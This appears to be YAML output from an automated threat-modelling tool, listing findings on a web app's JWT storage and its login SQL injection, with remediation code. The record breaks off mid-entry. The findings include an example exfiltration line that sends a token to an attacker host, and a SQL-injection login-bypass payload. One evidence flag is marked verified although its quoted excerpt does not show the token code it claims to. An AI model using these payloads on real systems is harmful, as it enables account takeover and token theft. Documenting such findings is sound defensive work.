threats:
- local_id: frontend-spa-001
  threat_category_id: TH-04
  additional_categories:
  - TH-10
  stride: Information Disclosure
  cwe: CWE-922
  title: JWT persisted in localStorage readable by any XSS — login.component.ts:105
  affected_parameter: token
  scenario: 'On every successful login the bearer JWT is written to localStorage (`login.component.ts:105`, `oauth.component.ts:51`)
    and re-read on each HTTP call by RequestInterceptor (`request.interceptor.ts:13-16`). localStorage has no HttpOnly equivalent,
    so any of the multiple confirmed DOM-XSS sinks in this SPA (`search-result.component.ts:143`, `about.component.html:51`)
    can run `fetch(attacker, {body: localStorage.token})` and exfiltrate a valid 8-hour session token to an attacker-controlled
    host. A physical-device-holder (ACT-D-08) with debugger access reads it directly from DevTools Application > Local Storage
    with zero exploitation.'
  evidence_summary: Token written to localStorage at login.component.ts:105 and read back unprotected by the HTTP interceptor;
    no HttpOnly/Secure cookie is the primary auth store.
  impact_description: Any successful XSS or local device access yields full account takeover for the 8-hour token lifetime,
    including admin sessions.
  likelihood: High
  impact: High
  risk: High
  controls_in_place: A duplicate copy is also placed in a cookie via ngy-cookie (login.component.ts:108) but it is set without
    HttpOnly/Secure/SameSite and the interceptor still reads from localStorage, so the cookie provides no protection.
  mitigation_title: Move session token to an HttpOnly Secure SameSite cookie issued by a Backend-for-Frontend, stop using
    localStorage
  remediation:
    effort: High
    steps:
    - Introduce a Backend-for-Frontend that holds the JWT server-side and issues the browser a session via Set-Cookie with
      HttpOnly, Secure and SameSite=Strict.
    - Remove the localStorage.setItem('token', ...) calls in login.component.ts:105 and oauth.component.ts:51 and delete the
      Authorization header logic in request.interceptor.ts:13-16 (the cookie is sent automatically).
    - Pair the cookie session with a CSRF token (double-submit or synchroniser) since SameSite alone is not a complete CSRF
      defence.
    code_example: "// Backend-for-Frontend sets the session cookie; SPA never touches the JWT\nres.cookie('session', signedJwt,\
      \ {\n  httpOnly: true, secure: true, sameSite: 'strict', maxAge: 8 * 60 * 60 * 1000\n})"
    reference: https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html#local-storage
  evidence:
  - file: frontend/src/app/login/login.component.ts
    line: 105
  evidence_check: verified
  prior_finding_ref: null
  architectural_violation: true
  actor_ids:
  - ACT-D-08
  primary_actor: ACT-D-08
  component_name: Angular Frontend SPA
  source: stride
  evidence_flags:
  - flag_id: EV-012
    verdict: verified
    reason: JWT/token handling visible at cited line
    line_excerpt: "this.user.email = this.emailControl.value\n    this.user.password = this.pass"
    verified_at: '2026-06-22T10:42:52.172220Z'
  id: T-001
  component: frontend-spa
  mitigation_ids:
  - M-035
  _title_source: JWT persisted in localStorage readable by any XSS (login.component.ts:105)
  vektor: internet-anon
- local_id: auth-001
  threat_category_id: TH-01
  additional_categories:
  - TH-02
  stride: Spoofing
  cwe: CWE-89
  title: SQL Injection — routes/login.ts:34
  affected_parameter: email
  scenario: 'The login handler builds its authentication query by string interpolation: `SELECT * FROM Users WHERE email =
    ''${req.body.email}'' AND password = ''...''` at routes/login.ts:34. `req.body.email` is never escaped or parameterised.
    An anonymous attacker (ACT-D-01) posts `{"email":"'' OR 1=1--","password":"x"}` to POST /rest/user/login; the `--` comments
    out the password predicate, the WHERE matches the first row, and the server issues a valid session token for the seeded
    admin account. Because the result is loaded with `plain: true`, the first matching row is returned directly.'
  evidence_summary: req.body.email is concatenated into models.sequelize.query() at routes/login.ts:34 with no parameter binding.
  impact_description: Full authentication bypass and login as any user (including admin) without knowing a password; the same
    injection point allows UNION-based data exfiltration from the Users table.
  likelihood: High
  impact: Critical
  risk: Critical
  controls_in_place: None. The query is raw string interpolation; security.hash() is applied to the password but not to the
    email predicate.
  mitigation_title: Replace string-interpolated login query with parameterised Sequelize replacements at routes/login.ts:34
  remediation:
    effort: Low
    steps:
    - 'Rewrite the query in routes/login.ts:34 to use bound parameters: `models.sequelize.query(''SELECT * FROM Users WHERE
      email = :email AND password = :pw AND deletedAt IS NULL'', { replacements: { email: req.body.email, pw: security.hash(req.body.password
      || '''') }, model: UserModel, plain: true })`.'
    - 'Prefer the model API entirely: `UserModel.findOne({ where: { email: req.body.email, password: security.hash(...) }
      })`, which binds parameters automatically.'
    - Add a server-side input schema (e.g. express-validator `body('email').isEmail()`) so malformed email values are rejected
      before reaching the data layer.
    code_example: "models.sequelize.query(\n  'SELECT * FROM Users WHERE email = :email AND password = :pw AND deletedAt IS\
      \ NULL',\n  { replacements: { email: req.body.email, pw: security.hash(req.body.password || '') },\n    model: UserModel,\
      \ plain: true })"
    reference: https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html
  evidence:
  - file: routes/login.ts
    line: 34
  evidence_check: verified
  prior_finding_ref: null
  architectural_violation: false
  actor_ids:
